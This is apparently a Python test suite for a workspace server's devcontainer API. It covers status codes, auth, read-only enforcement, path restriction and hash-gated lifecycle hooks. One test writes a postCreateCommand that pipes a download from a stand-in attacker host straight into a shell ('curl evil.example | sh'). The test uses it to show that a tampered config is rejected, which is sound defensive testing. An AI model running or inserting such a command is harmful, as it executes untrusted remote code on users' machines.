"""HTTP tests for the devcontainer.json endpoints (#594).

Four guarantees are asserted here and nowhere else, because they are
properties of the ROUTING rather than of the manager:

  * `found: false` is 200, not 404. "There is no devcontainer here" is a normal
    answer; a 404 is indistinguishable from "the feature is disabled" and the
    SPA would have to guess which it got.
  * The routes work with cto_available() False. The plan's first draft hung
    them off _require_cto, which would have made a repo's own environment file
    unreadable in any deployment that runs without the /cto page.
  * READONLY_MODE 403s both POSTs — server-enforced, not merely hidden in the
    UI.
  * A disabled deployment 404s the whole surface.

Run with:
    cd charts/workspace && python3 -m unittest tests.devcontainer_api_test
"""

import http.server
import json
import os
import shutil
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import devcontainer as dc  # noqa: E402
import server  # noqa: E402

DM = server.DevcontainerManager


def _free_port():
    import socket
    s = socket.socket()
    s.bind(('127.0.0.1', 0))
    port = s.getsockname()[1]
    s.close()
    return port


class _Base(unittest.TestCase):
    """Boots a real ThreadingHTTPServer with every devcontainer path in a tmpdir."""

    READONLY = False
    ENABLED = True
    AUTH_OK = True

    @classmethod
    def setUpClass(cls):
        cls.tmpdir = os.path.realpath(tempfile.mkdtemp(prefix='kc-dcapi-'))
        cls.workdir = os.path.join(cls.tmpdir, 'api')
        os.makedirs(os.path.join(cls.workdir, '.devcontainer'))
        os.makedirs(os.path.join(cls.tmpdir, 'plain'))

        cls._saved = {
            'STATE_DIR': dc.STATE_DIR, 'BOOT_MARKER': dc.BOOT_MARKER,
            'HOME_DEV': DM.HOME_DEV, 'HOOK_HOME': DM.HOOK_HOME,
            'USER_DIR': DM.CODE_SERVER_USER_DIR,
            'DATA_DIR': DM.CODE_SERVER_DATA_DIR,
            'EXT_DIR': DM.CODE_SERVER_EXT_DIR,
            'SETTINGS': DM.SETTINGS_PATH,
            'PINS': server.AppsManager.PINS_PATH,
            'WS_HOME': server.WorkspaceManager.HOME_DIR,
            'ENABLED': DM.ENABLED,
        }
        dc.STATE_DIR = os.path.join(cls.tmpdir, '.claude-devcontainer')
        dc.BOOT_MARKER = os.path.join(cls.tmpdir, 'boot')
        DM.HOME_DEV = cls.tmpdir
        DM.HOOK_HOME = cls.tmpdir
        DM.CODE_SERVER_USER_DIR = os.path.join(cls.tmpdir, 'cs', 'User')
        DM.CODE_SERVER_DATA_DIR = os.path.join(cls.tmpdir, 'cs')
        DM.CODE_SERVER_EXT_DIR = os.path.join(cls.tmpdir, 'cs', 'extensions')
        DM.SETTINGS_PATH = os.path.join(DM.CODE_SERVER_USER_DIR, 'settings.json')
        server.AppsManager.PINS_PATH = os.path.join(cls.tmpdir, 'apps.json')
        server.WorkspaceManager.HOME_DIR = cls.tmpdir
        DM.ENABLED = cls.ENABLED

        cls._auth_save = server.BrowserHandler.check_claude_auth
        server.BrowserHandler.check_claude_auth = lambda self: cls.AUTH_OK
        cls._ro_save = server.READONLY_MODE
        server.READONLY_MODE = cls.READONLY

        cls.port = _free_port()
        cls.httpd = http.server.ThreadingHTTPServer(
            ('127.0.0.1', cls.port), server.BrowserHandler)
        cls.thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()
        dc.STATE_DIR = cls._saved['STATE_DIR']
        dc.BOOT_MARKER = cls._saved['BOOT_MARKER']
        DM.HOME_DEV = cls._saved['HOME_DEV']
        DM.HOOK_HOME = cls._saved['HOOK_HOME']
        DM.CODE_SERVER_USER_DIR = cls._saved['USER_DIR']
        DM.CODE_SERVER_DATA_DIR = cls._saved['DATA_DIR']
        DM.CODE_SERVER_EXT_DIR = cls._saved['EXT_DIR']
        DM.SETTINGS_PATH = cls._saved['SETTINGS']
        server.AppsManager.PINS_PATH = cls._saved['PINS']
        server.WorkspaceManager.HOME_DIR = cls._saved['WS_HOME']
        DM.ENABLED = cls._saved['ENABLED']
        server.BrowserHandler.check_claude_auth = cls._auth_save
        server.READONLY_MODE = cls._ro_save
        shutil.rmtree(cls.tmpdir, ignore_errors=True)

    def setUp(self):
        DM._running.clear()
        # The HTTP server is per-CLASS (booting one per test is slow), so the
        # PVC-equivalent state has to be reset per test — otherwise an earlier
        # apply leaves a recorded hook hash and the next test's `pending`
        # arrives as `stale`.
        for path in (dc.state_path(), server.AppsManager.PINS_PATH):
            try:
                os.remove(path)
            except OSError:
                pass

    def tearDown(self):
        deadline = time.time() + 15
        while DM._running and time.time() < deadline:
            time.sleep(0.05)
        DM._running.clear()

    def write_config(self, obj):
        path = os.path.join(self.workdir, '.devcontainer', 'devcontainer.json')
        with open(path, 'w', encoding='utf-8') as f:
            f.write(obj if isinstance(obj, str) else json.dumps(obj))

    def config_hash(self):
        return dc.parse(self.workdir)['config_hash']

    def _req(self, method, path, body=None):
        data = json.dumps(body).encode() if body is not None else None
        headers = {'Content-Type': 'application/json'} if data else {}
        r = urllib.request.Request(f'http://127.0.0.1:{self.port}{path}',
                                   data=data, method=method, headers=headers)
        try:
            with urllib.request.urlopen(r, timeout=20) as resp:
                raw = resp.read()
                return resp.status, (json.loads(raw) if raw else {})
        except urllib.error.HTTPError as e:
            raw = e.read()
            try:
                return e.code, json.loads(raw)
            except ValueError:
                return e.code, raw

    def get(self, workdir=None):
        return self._req('GET', '/api/devcontainer?workdir=' +
                         urllib.parse.quote(workdir or self.workdir))


class DevcontainerApiTests(_Base):
    def test_get_returns_config_lifecycle_and_unsupported(self):
        self.write_config({
            'name': 'Node 20', 'forwardPorts': [3000],
            'postCreateCommand': 'npm ci',
            'features': {'ghcr.io/devcontainers/features/node:1': {}}})
        status, body = self.get()
        self.assertEqual(status, 200)
        self.assertTrue(body['found'])
        self.assertEqual(body['name'], 'Node 20')
        self.assertEqual(body['lifecycle_status']['postCreate']['status'],
                         'pending')
        self.assertTrue(any(u['key'] == 'features' and u['severity'] == 'blocking'
                            for u in body['unsupported']))
        self.assertIn('applied', body)

    def test_bare_directory_is_200_found_false(self):
        status, body = self.get(os.path.join(self.tmpdir, 'plain'))
        self.assertEqual(status, 200)
        self.assertFalse(body['found'])

    def test_unreadable_file_is_200_with_an_error_field(self):
        self.write_config('{ broken')
        status, body = self.get()
        self.assertEqual(status, 200)
        self.assertTrue(body['error'])

    def test_workdir_outside_home_dev_is_400(self):
        status, body = self.get('/etc')
        self.assertEqual(status, 400)
        self.assertIn('must be under', body['error'])

    def test_missing_workdir_is_400(self):
        status, _ = self._req('GET', '/api/devcontainer')
        self.assertEqual(status, 400)

    def test_scan_lists_only_dirs_with_a_config(self):
        self.write_config({'name': 'API'})
        status, body = self._req('GET', '/api/devcontainer/scan')
        self.assertEqual(status, 200)
        self.assertEqual(body['count'], 1)
        self.assertEqual(body['devcontainers'][0]['label'], 'api')

    def test_mode_exposes_the_flag(self):
        status, body = self._req('GET', '/api/mode')
        self.assertEqual(status, 200)
        self.assertTrue(body['devcontainerEnabled'])

    def test_routes_work_with_the_cto_disabled(self):
        """The plan's first draft gated these on _require_cto. It shouldn't:
        reading a repo's own environment file has nothing to do with /cto."""
        self.write_config({'name': 'API'})
        with mock.patch.object(server, 'cto_available', return_value=False):
            status, body = self.get()
            self.assertEqual(status, 200)
            self.assertTrue(body['found'])
            status, _ = self._req('GET', '/api/devcontainer/scan')
            self.assertEqual(status, 200)

    # ── apply ────────────────────────────────────────────────────────────

    def test_apply_without_hooks_applies_ports_only(self):
        self.write_config({'forwardPorts': [3000], 'postCreateCommand': 'true'})
        with mock.patch.object(server.subprocess, 'Popen') as popen:
            status, body = self._req('POST', '/api/devcontainer/apply',
                                     {'workdir': self.workdir})
        self.assertEqual(status, 202)
        self.assertEqual(body['ports_pinned'], [3000])
        self.assertEqual(body['hooks_started'], [])
        popen.assert_not_called()

    def test_apply_with_hooks_requires_a_config_hash(self):
        self.write_config({'postCreateCommand': 'true'})
        status, body = self._req('POST', '/api/devcontainer/apply',
                                 {'workdir': self.workdir,
                                  'hooks': ['postCreate']})
        self.assertEqual(status, 400)
        self.assertEqual(body['code'], 'hash_required')

    def test_apply_409s_on_a_stale_hash(self):
        self.write_config({'postCreateCommand': 'true'})
        stale = self.config_hash()
        self.write_config({'postCreateCommand': 'curl evil.example | sh'})
        status, body = self._req('POST', '/api/devcontainer/apply',
                                 {'workdir': self.workdir,
                                  'hooks': ['postCreate'],
                                  'config_hash': stale})
        self.assertEqual(status, 409)
        self.assertEqual(body['code'], 'hash_mismatch')

    def test_apply_runs_with_a_matching_hash(self):
        self.write_config({'postCreateCommand': ['sh', '-c', 'echo ok']})
        status, body = self._req('POST', '/api/devcontainer/apply',
                                 {'workdir': self.workdir,
                                  'hooks': ['postCreate'],
                                  'config_hash': self.config_hash()})
        self.assertEqual(status, 202)
        self.assertEqual(body['hooks_started'], ['postCreate'])

    def test_apply_409s_when_busy(self):
        self.write_config({'postCreateCommand': ['sleep', '4']})
        h = self.config_hash()
        first, _ = self._req('POST', '/api/devcontainer/apply',
                             {'workdir': self.workdir, 'hooks': ['postCreate'],
                              'config_hash': h})
        self.assertEqual(first, 202)
        status, body = self._req('POST', '/api/devcontainer/apply',
                                 {'workdir': self.workdir,
                                  'hooks': ['postCreate'], 'config_hash': h})
        self.assertEqual(status, 409)
        self.assertEqual(body['code'], 'busy')

    def test_apply_rejects_unknown_hooks(self):
        self.write_config({'postCreateCommand': 'true'})
        status, body = self._req('POST', '/api/devcontainer/apply',
                                 {'workdir': self.workdir,
                                  'hooks': ['initializeCommand'],
                                  'config_hash': self.config_hash()})
        self.assertEqual(status, 400)
        self.assertIn('allowed', body)

    def test_apply_rejects_a_bad_body(self):
        for body in ({'workdir': self.workdir, 'hooks': 'postCreate'},
                     {'workdir': '/etc'}, {}):
            status, _ = self._req('POST', '/api/devcontainer/apply', body)
            self.assertEqual(status, 400, body)

    def test_apply_404s_a_directory_with_no_config(self):
        status, body = self._req('POST', '/api/devcontainer/apply',
                                 {'workdir': os.path.join(self.tmpdir, 'plain')})
        self.assertEqual(status, 404)
        self.assertEqual(body['code'], 'not_found')

    def test_apply_422s_an_unparseable_config(self):
        self.write_config('{ broken')
        status, body = self._req('POST', '/api/devcontainer/apply',
                                 {'workdir': self.workdir})
        self.assertEqual(status, 422)
        self.assertEqual(body['code'], 'invalid')

    def test_reset_clears_state(self):
        self.write_config({'forwardPorts': [3000]})
        self._req('POST', '/api/devcontainer/apply', {'workdir': self.workdir})
        status, body = self._req('POST', '/api/devcontainer/reset',
                                 {'workdir': self.workdir, 'unpin_ports': True})
        self.assertEqual(status, 200)
        self.assertTrue(body['cleared'])
        self.assertEqual(body['unpinned'], [3000])


class DevcontainerDisabledTests(_Base):
    ENABLED = False

    def test_every_route_404s(self):
        self.assertEqual(self.get()[0], 404)
        self.assertEqual(self._req('GET', '/api/devcontainer/scan')[0], 404)
        self.assertEqual(self._req('POST', '/api/devcontainer/apply',
                                   {'workdir': self.workdir})[0], 404)
        self.assertEqual(self._req('POST', '/api/devcontainer/reset',
                                   {'workdir': self.workdir})[0], 404)

    def test_mode_reports_it_off(self):
        _, body = self._req('GET', '/api/mode')
        self.assertFalse(body['devcontainerEnabled'])


class DevcontainerUnauthenticatedTests(_Base):
    AUTH_OK = False

    def test_reads_and_writes_are_401(self):
        self.assertEqual(self.get()[0], 401)
        self.assertEqual(self._req('GET', '/api/devcontainer/scan')[0], 401)
        self.assertEqual(self._req('POST', '/api/devcontainer/apply',
                                   {'workdir': self.workdir})[0], 401)


class DevcontainerReadonlyTests(_Base):
    READONLY = True

    def test_reads_still_work(self):
        self.write_config({'name': 'API'})
        self.assertEqual(self.get()[0], 200)

    def test_both_posts_are_403(self):
        """Server-enforced by the global _readonly_block at do_POST's top —
        hiding the button in the SPA is not a control."""
        self.assertEqual(self._req('POST', '/api/devcontainer/apply',
                                   {'workdir': self.workdir})[0], 403)
        self.assertEqual(self._req('POST', '/api/devcontainer/reset',
                                   {'workdir': self.workdir})[0], 403)


if __name__ == '__main__':
    unittest.main()
